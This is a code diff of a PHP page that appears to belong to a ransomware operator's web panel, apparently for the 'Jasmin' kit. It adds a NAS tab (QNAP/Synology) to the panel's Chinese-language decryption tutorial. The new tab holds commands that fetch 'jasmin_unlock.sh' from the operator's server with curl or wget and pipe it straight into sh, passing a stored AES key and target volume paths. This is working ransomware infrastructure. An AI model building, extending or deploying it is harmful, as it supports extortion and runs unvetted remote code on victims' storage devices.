@@ -7,11 +7,25 @@ $aes_pwd = is_file($ks_path) ? trim(file_get_contents($ks_path)) : 'KEY_NOT_SET'
 ?>
 <section class="panel" id="panel-decrypt" style="display:none">
 <h2><i class="fas fa-unlock-alt"></i> 解密教程</h2>
+<div class="dt-content" id="dt-nas" style="display:none">
+<h3>🗄️ NAS 一键解密（QNAP / Synology）</h3>
+<pre class="dt-code"># 先 SSH 登录 NAS（QNAP: 控制台>网络和文件服务>启用SSH / Synology: 控制面板>终端机和SNMP>启用SSH）
+# 不写目录则解密全部加密文件（数据卷 + 所有真实挂载点）—— 与加密范围完全对齐
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"
+
+# 只需解特定数据卷时，在末尾追加（可多个，逗号或空格分隔）
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /volume1
+curl -sL <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>" /share/CACHEDEV1_DATA /share/CACHEDEV2_DATA
+
+# 若 NAS 上 curl 不可用，改用 wget（QNAP/Synology 默认都带 wget）
+wget -qO- <?=$srv?>/payloads/jasmin_unlock.sh | sh -s <?=$srv?> "<?=$aes_pwd?>"</pre>
+</div>
 <div class="dt-note" style="margin-bottom:16px"><i class="fas fa-shield-alt"></i> 私钥已AES-256-CBC加密存储，解密命令自动下载加密私钥→内存解密→执行→清理</div>
 <div class="decrypt-tabs">
   <button class="dt-btn active" onclick="showDT('win')"><i class="fab fa-windows"></i> Windows</button>
   <button class="dt-btn" onclick="showDT('linux')"><i class="fab fa-linux"></i> Linux</button>
   <button class="dt-btn" onclick="showDT('mac')"><i class="fab fa-apple"></i> macOS</button>
+<button class="dt-btn" onclick="showDT('nas')"><i class="fas fa-server"></i> NAS</button>
 </div>
 
 <div class="dt-content" id="dt-win">
